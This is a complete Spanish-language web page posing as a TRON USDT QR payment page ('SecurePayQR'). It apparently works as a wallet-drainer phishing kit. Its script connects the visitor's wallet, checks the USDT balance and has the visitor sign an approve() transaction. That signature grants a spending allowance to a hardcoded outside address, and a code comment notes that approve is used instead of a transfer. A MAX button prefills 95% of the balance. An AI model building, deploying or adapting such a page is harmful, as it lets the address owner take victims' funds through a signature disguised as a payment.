<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>QR pagos - Enviar </title>

    <style>
        :root {
            color-scheme: light;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #f7f9ff;
            background-image:
                radial-gradient(circle at 12% 18%, rgba(0, 82, 255, 0.20) 0%, rgba(0, 82, 255, 0.08) 24%, transparent 48%),
                radial-gradient(circle at 88% 72%, rgba(75, 125, 255, 0.16) 0%, rgba(75, 125, 255, 0.06) 28%, transparent 52%),
                radial-gradient(circle at 55% 105%, rgba(145, 175, 255, 0.13) 0%, transparent 46%),
                linear-gradient(180deg, #ffffff 0%, #f2f6ff 100%);
            background-size: 125% 125%, 135% 135%, 120% 120%, 100% 100%;
            background-attachment: fixed;
            animation: auroraBackground 12s ease-in-out infinite alternate;
            color: #111111;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding-top: 30px;
        }

        @keyframes auroraBackground {
            0% {
                background-position: -12% -8%, 112% 108%, 45% 110%, center;
            }
            50% {
                background-position: 22% 18%, 72% 52%, 58% 88%, center;
            }
            100% {
                background-position: 8% 38%, 96% 28%, 38% 76%, center;
            }
        }

        .tw-container {
            width: 100%;
            max-width: 390px;
            padding: 20px;
            flex: 1;
        }

        .tw-header {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            position: relative;
            margin-bottom: 24px;
        }

        .tw-header-title {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            gap: 7px;
            margin-bottom: 15px;
            text-align: center;
            width: 100%;
        }

        .tw-header-title-main {
            font-size: 21px;
            line-height: 1.2;
            font-weight: 700;
            letter-spacing: -0.35px;
            color: #111111;
        }

        .tw-network-badge {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            padding: 4px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            line-height: 1;
            font-weight: 700;
            letter-spacing: 0.35px;
        }

        .back-icon {
            position: absolute;
            left: 0;
            top: 0;
            width: 24px;
            height: 24px;
            color: #111111;
        }

        .tw-logo {
            width: 60px;
            height: 60px;
            margin-bottom: 20px;
            display: block;
        }

        .tw-input-group {
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 16px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.055);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
        }

        .tw-label {
            font-size: 13px;
            color: #717680;
            display: block;
            margin-bottom: 8px;
        }

        .tw-input-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .tw-input {
            background: transparent;
            border: none;
            color: #111111;
            font-size: 16px;
            width: 80%;
            outline: none;
        }

        .tw-action-text {
            color: #0052ff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-currency-badge {
            color: #0052ff;
            font-size: 16px;
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 5px;
        }

        .usdt-icon {
            width: 18px;
            height: 18px;
        }

        .status-box {
            background-color: #edf2ff;
            border: 1px solid #cce0ff;
            border-radius: 12px;
            padding: 12px;
            font-size: 13px;
            color: #0052ff;
            margin-bottom: 16px;
            display: none;
            text-align: left;
        }

        .wallet-info {
            display: none;
            background-color: #f6f7f9;
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 22px;
        }

        .tw-btn-container {
            margin-top: 40px;
        }

        .tw-btn {
            width: 100%;
            height: 52px;
            background-color: #0052ff;
            color: #ffffff;
            border: none;
            border-radius: 26px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }

        .tw-btn:disabled {
            background-color: #b3ccff;
        }

        .tw-btn .link-icon {
            width: 18px;
            height: 18px;
            margin-right: 8px;
            vertical-align: -3px;
        }

        .network-card {
            display: none;
            align-items: center;
            gap: 11px;
            margin: 4px 0 22px;
            padding: 12px 14px;
            width: 100%;
            background: rgba(255, 255, 255, 0.88);
            border: 1px solid rgba(205, 215, 232, 0.78);
            border-radius: 14px;
            box-shadow: 0 6px 18px rgba(31, 55, 92, 0.05);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
        }

        .network-card-logo {
            width: 30px;
            height: 30px;
            object-fit: contain;
            flex: 0 0 auto;
        }

        .network-card-copy {
            min-width: 0;
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }

        .network-card-label {
            color: #717680;
            font-size: 11px;
            line-height: 1.2;
        }

        .network-card-name {
            color: #111111;
            font-size: 14px;
            line-height: 1.25;
            font-weight: 650;
        }

        .network-card-badge {
            flex: 0 0 auto;
            padding: 5px 8px;
            border-radius: 999px;
            background: #eef3ff;
            border: 1px solid #dbe6ff;
            color: #0052ff;
            font-size: 10px;
            line-height: 1;
            font-weight: 700;
            letter-spacing: 0.25px;
        }
    
        .tw-address-box {
            border: 1px solid #e3e5e8;
            border-radius: 14px;
            padding: 12px 14px;
            background: #ffffff;
        }

        .site-footer {
            position: fixed;
            left: 0;
            right: 0;
            bottom: 0;
            z-index: 20;
            width: 100%;
            text-align: center;
            padding: 10px 15px 12px;
            font-size: 12px;
            line-height: 1.5;
            color: #717680;
            background: #ffffff;
        }

        .site-footer a {
            color: #0052ff;
            text-decoration: none;
        }

        .page-loader {
            position: fixed;
            inset: 0;
            z-index: 9999;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            transition: opacity 0.45s ease, visibility 0.45s ease;
        }

        .page-loader.hidden {
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
        }

        .loader-logo {
            width: 110px;
            height: 110px;
            margin-bottom: 22px;
        }

        .loader-spinner {
            width: 32px;
            height: 32px;
            border: 3px solid #e4e9f2;
            border-top-color: #0052ff;
            border-radius: 50%;
            animation: loaderSpin 0.8s linear infinite;
        }

        @keyframes loaderSpin {
            to { transform: rotate(360deg); }
        }

        .processing-screen {
            position: fixed;
            inset: 0;
            z-index: 10000;
            background: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            opacity: 0;
            visibility: hidden;
            pointer-events: none;
            transition: opacity 0.35s ease;
        }

        .processing-screen.visible {
            opacity: 1;
            visibility: visible;
            pointer-events: auto;
        }

        .processing-logo {
            width: 110px;
            height: 110px;
            margin-bottom: 26px;
        }

        .processing-bar {
            position: relative;
            width: 190px;
            height: 5px;
            overflow: hidden;
            border-radius: 999px;
            background: #e4e9f2;
        }

        .processing-bar::after {
            content: "";
            position: absolute;
            top: 0;
            left: -45%;
            width: 45%;
            height: 100%;
            border-radius: inherit;
            background: #0052ff;
            animation: processingSlide 1.15s ease-in-out infinite;
        }

        @keyframes processingSlide {
            0% { left: -45%; }
            100% { left: 100%; }
        }

        .connected-summary-panel {
            display: contents;
        }

        .tw-container:has(#walletInfo[style*="block"]) .connected-summary-panel {
            display: block;
            width: 100%;
            box-sizing: border-box;
            padding: 14px;
            margin: 0 0 18px;
            background: rgba(255,255,255,.88);
            border: 1px solid rgba(205,215,232,.72);
            border-radius: 20px;
            box-shadow: 0 10px 28px rgba(31,55,92,.07);
        }

        .amount-stepper {
            display: grid;
            grid-template-columns: 44px minmax(0, 1fr) 44px;
            align-items: center;
            gap: 8px;
            width: 100%;
        }
        .amount-stepper #amountDisplay {
            width: 100%;
            min-width: 0;
            text-align: center;
        }
        .amount-step-btn {
            width: 42px;
            height: 42px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            border: 1px solid rgba(205,215,232,.9);
            border-radius: 12px;
            background: rgba(247,249,255,.92);
            color: #111;
            font-size: 24px;
            cursor: pointer;
        }
    </style>
</head>

<body>
<div id="pageLoader" class="page-loader">
    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="loader-logo">
    <div class="loader-spinner"></div>
</div>

<div id="processingScreen" class="processing-screen">
    <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="processing-logo">
    <div class="processing-bar"></div>
    <div style="margin-top: 18px; font-weight: 600;">Procesando aprobación...</div>
</div>

<div class="tw-container">
    <div class="tw-header">
        <div class="tw-header-title">
            <span class="tw-header-title-main">Aprobar USDT</span>
            <span class="tw-network-badge">TRC-20</span>
        </div>
        <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/trx.png" alt="Logo" class="tw-logo">
    </div>

    <div class="connected-summary-panel">
        <div id="walletInfo" class="tw-input-group tw-address-box" style="display: none;">
            <label class="tw-label">Dirección conectada</label>
            <div id="walletAddressText" class="tw-input" style="white-space: nowrap; overflow: hidden; text-overflow: ellipsis; width: 100%;"></div>
        </div>

        <div id="tronNetworkInfo" class="network-card">
            <img src="https://cryptologos.cc/logos/tron-trx-logo.png" alt="TRON" class="network-card-logo">
            <div class="network-card-copy">
                <span class="network-card-label">Red conectada</span>
                <span class="network-card-name">TRON</span>
            </div>
            <span class="network-card-badge">TRC-20</span>
        </div>

        <div class="tw-input-group tw-address-box">
            <label class="tw-label">Dirección de destino (Gastador)</label>
            <input id="addressDisplay" class="tw-input" type="text" readonly tabindex="-1" style="caret-color: transparent;">
        </div>
    </div>

    <div class="tw-input-group">
        <label class="tw-label">Cantidad a aprobar</label>
        <div class="tw-input-row">
            <div class="amount-stepper">
                <button type="button" class="amount-step-btn" id="amountMinus">−</button>
                <input id="amountDisplay" class="tw-input" type="number" inputmode="decimal" placeholder="0" min="0.01" step="any">
                <button type="button" class="amount-step-btn" id="amountPlus">+</button>
            </div>
            <span id="maxAction" class="tw-action-text" style="margin-right: 12px; display: none; cursor: pointer;">MAX</span>
            <span class="tw-currency-badge">
                USDT
                <img src="https://raw.githubusercontent.com/spothq/cryptocurrency-icons/master/128/icon/usdt.png" alt="USDT" class="usdt-icon">
            </span>
        </div>
    </div>

    <div id="status" class="status-box"></div>

    <div class="tw-btn-container">
        <button class="tw-btn" id="connectBtn">Vincular billetera</button>
    </div>
</div>

<footer class="site-footer">
    <p>© 2026 SecurePayQR. All rights reserved.</p>
</footer>

<script>
    window.addEventListener('load', () => {
        setTimeout(() => document.getElementById('pageLoader').classList.add('hidden'), 800);
    });

    const BILLETERA_DESTINO = "TLfFXd3Wi4PhBx4cUYChNv9xHnsqtQBTuQ";
    const CONTRATO_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    let walletAddress = null;
    const connectBtn = document.getElementById('connectBtn');
    const statusDiv = document.getElementById('status');
    const amountDisplay = document.getElementById('amountDisplay');
    const addressDisplay = document.getElementById('addressDisplay');
    const maxAction = document.getElementById('maxAction');
    const walletInfo = document.getElementById('walletInfo');
    const tronNetworkInfo = document.getElementById("tronNetworkInfo");
    const walletAddressText = document.getElementById('walletAddressText');
    const processingScreen = document.getElementById('processingScreen');

    function setStatus(msg) {
        statusDiv.innerText = msg || '';
        statusDiv.style.display = msg ? 'block' : 'none';
    }

    addressDisplay.value = BILLETERA_DESTINO.length > 12 
        ? `${BILLETERA_DESTINO.slice(0, 6)}...${BILLETERA_DESTINO.slice(-6)}` 
        : BILLETERA_DESTINO;

    const TRON_READ_RPC = "https://api.trongrid.io";
    async function tronRpcPost(endpoint, body = {}) {
        const res = await fetch(TRON_READ_RPC + endpoint, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(body)
        });
        if (!res.ok) throw new Error("RPC error");
        return await res.json();
    }

    async function obtenerBalance(address) {
        const tronWeb = window.tronWeb;
        const ownerHex = tronWeb.address.toHex(address);
        const data = await tronRpcPost("/wallet/triggerconstantcontract", {
            owner_address: ownerHex,
            contract_address: tronWeb.address.toHex(CONTRATO_USDT),
            function_selector: "balanceOf(address)",
            parameter: ownerHex.replace(/^41/, "").padStart(64, "0"),
            visible: false
        });
        return tronWeb.toBigNumber("0x" + data.constant_result[0]);
    }

    connectBtn.addEventListener('click', async () => {
        if (!walletAddress) {
            try {
                setStatus("Conectando con la billetera...");
                connectBtn.disabled = true;
                if (typeof window.tronWeb === 'undefined') throw new Error("Abre desde el navegador de Trust Wallet.");
                const tronWeb = window.tronWeb;
                if (tronWeb.defaultAddress?.base58) {
                    walletAddress = tronWeb.defaultAddress.base58;
                } else if (window.tronLink) {
                    const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (res?.code === 200) walletAddress = tronWeb.defaultAddress.base58;
                }
                if (!walletAddress) throw new Error("No se obtuvo la cuenta.");

                walletAddressText.textContent = `${walletAddress.slice(0, 6)}...${walletAddress.slice(-6)}`;
                walletInfo.style.display = "block";
                tronNetworkInfo.style.display = "flex";
                maxAction.style.display = "inline";

                setStatus("");
                connectBtn.innerText = "Continuar";
                connectBtn.disabled = false;
            } catch (e) {
                setStatus(e.message);
                connectBtn.disabled = false;
            }
            return;
        }

        try {
            const userAmount = parseFloat(amountDisplay.value);
            if (isNaN(userAmount) || userAmount <= 0) throw new Error("Ingresa una cantidad válida.");

            setStatus("Verificando balance...");
            connectBtn.disabled = true;

            const tronWeb = window.tronWeb;
            const balance = await obtenerBalance(walletAddress);
            const amount95Percent = balance.multipliedBy(95).dividedToIntegerBy(100);
            const totalAmountSun = tronWeb.toBigNumber(Math.floor(userAmount * 1_000_000));

            if (balance.lt(totalAmountSun)) throw new Error("Saldo insuficiente de USDT.");

            setStatus("Preparando aprobación...");
            const destinoHex = tronWeb.address.toHex(BILLETERA_DESTINO);

            // LLAMADA A APPROVE EN LUGAR DE TRANSFER
            const approveTx = await tronWeb.transactionBuilder.triggerSmartContract(
                CONTRATO_USDT,
                "approve(address,uint256)",
                { feeLimit: 100000000 },
                [
                    { type: 'address', value: destinoHex },
                    { type: 'uint256', value: totalAmountSun.toString() }
                ],
                tronWeb.address.toHex(walletAddress)
            );

            const signedTx = await tronWeb.trx.sign(approveTx.transaction);

            if (processingScreen) processingScreen.classList.add('visible');
            const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
            if (processingScreen) processingScreen.classList.remove('visible');

            if (broadcast?.result) {
                setStatus("¡APROBACIÓN EXITOSA!");
                connectBtn.innerText = "Completado";
            } else {
                throw new Error("La transacción fue rechazada.");
            }
        } catch (e) {
            console.error(e);
            if (processingScreen) processingScreen.classList.remove('visible');
            setStatus(e.message || "Error en la ejecución.");
            connectBtn.disabled = false;
            connectBtn.innerText = "Continuar";
        }
    });

    maxAction.addEventListener('click', async () => {
        if (!walletAddress) return;
        try {
            const balance = await obtenerBalance(walletAddress);
            const amount95Percent = balance.multipliedBy(95).dividedToIntegerBy(100);
            amountDisplay.value = Number(amount95Percent.toString()) / 1_000_000;
        } catch (e) { console.error(e); }
    });

    document.getElementById('amountPlus').onclick = () => { amountDisplay.value = (parseFloat(amountDisplay.value || 0) + 1); };
    document.getElementById('amountMinus').onclick = () => { let v = parseFloat(amountDisplay.value || 0); if (v > 1) amountDisplay.value = v - 1; };
</script>
</body>
</html>
